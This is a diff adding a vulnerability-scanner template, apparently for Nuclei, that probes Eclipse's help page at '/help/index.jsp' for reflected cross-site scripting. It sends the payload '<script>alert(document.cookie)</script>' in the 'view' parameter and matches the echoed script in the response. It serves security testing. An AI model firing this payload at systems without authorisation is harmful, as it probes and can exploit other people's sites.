@@ -1,0 +1,18 @@
+http:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    type: word
+    words:
+    - <script>alert(document.cookie)</script>
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/help/index.jsp?view=<script>alert(document.cookie)</script>'
+id: eclipse-xss
+info:
+  author: h0tak88r
+  name: Eclipse Reflected XSS vulnerability
+  severity: medium
